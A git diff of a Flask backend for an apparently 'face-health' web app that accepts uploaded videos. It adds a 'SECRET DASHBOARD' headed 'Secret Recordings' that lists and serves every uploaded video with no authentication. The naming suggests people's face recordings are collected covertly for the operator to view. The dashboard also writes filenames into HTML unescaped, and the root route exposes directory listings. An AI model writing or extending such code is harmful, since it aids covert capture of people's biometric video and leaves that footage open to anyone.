@@ -3,40 +3,34 @@ from flask_cors import CORS
 import os
 from datetime import datetime
 
-# Current Folder Path
+# --- Folder Setup ---
 BASE_DIR = os.path.abspath(os.path.dirname(__file__))
-# Frontend Path (Sibling folder)
 FRONTEND_DIR = os.path.join(BASE_DIR, '..', 'face-health-frontend')
-FRONTEND_DIR = os.path.abspath(FRONTEND_DIR) # Make it absolute
-
+FRONTEND_DIR = os.path.abspath(FRONTEND_DIR)
 UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')
 
 app = Flask(__name__, static_folder=FRONTEND_DIR)
 CORS(app)
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
+# 1. Main Website
 @app.route('/')
 def serve_index():
-    # Check if file exists
     file_path = os.path.join(FRONTEND_DIR, 'index.html')
-    
     if not os.path.exists(file_path):
-        # DEBUG: Agar file nahi mili, toh batao kya dikh raha hai
         return jsonify({
             "Error": "index.html not found!",
             "Server is looking in": FRONTEND_DIR,
-            "Files in Frontend Folder": os.listdir(FRONTEND_DIR) if os.path.exists(FRONTEND_DIR) else "Frontend folder not found!",
-            "Current Backend Folder": BASE_DIR,
-            "Files in Backend": os.listdir(BASE_DIR),
-            "Root files (..)": os.listdir(os.path.join(BASE_DIR, '..'))
+            "Files in Frontend": os.listdir(FRONTEND_DIR) if os.path.exists(FRONTEND_DIR) else "Folder Missing"
         })
-    
     return send_from_directory(FRONTEND_DIR, 'index.html')
 
+# 2. Static Files (JS/CSS)
 @app.route('/<path:path>')
 def serve_static(path):
     return send_from_directory(FRONTEND_DIR, path)
 
+# 3. Video Upload
 @app.route('/upload', methods=['POST'])
 def upload_file():
     if 'video' not in request.files:
@@ -47,6 +41,32 @@ def upload_file():
     filepath = os.path.join(UPLOAD_FOLDER, filename)
     file.save(filepath)
     return jsonify({"status": "success", "filename": filename}), 200
+
+# 4. SECRET DASHBOARD (Yahan sab videos dikhengi)
+@app.route('/dashboard')
+def dashboard():
+    if not os.path.exists(UPLOAD_FOLDER):
+        return "<h3>No uploads folder created yet.</h3>"
+    
+    files = os.listdir(UPLOAD_FOLDER)
+    if not files:
+        return "<h3>No videos recorded yet. Go to home page and record one!</h3>"
+        
+    # Simple HTML list to show videos
+    html = """
+    <body style="background: #0f172a; color: white; font-family: sans-serif; padding: 20px;">
+        <h1>🕵️‍♂️ Secret Recordings</h1>
+        <ul style="list-style: none; padding: 0;">
+    """
+    for f in files:
+        html += f'<li style="margin: 10px 0;"><a href="/videos/{f}" target="_blank" style="color: #4ade80; text-decoration: none; font-size: 18px;">🎥 {f}</a></li>'
+    html += "</ul></body>"
+    return html
+
+# 5. Video Play Karne Ke Liye Route
+@app.route('/videos/<filename>')
+def view_video(filename):
+    return send_from_directory(UPLOAD_FOLDER, filename)
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000)
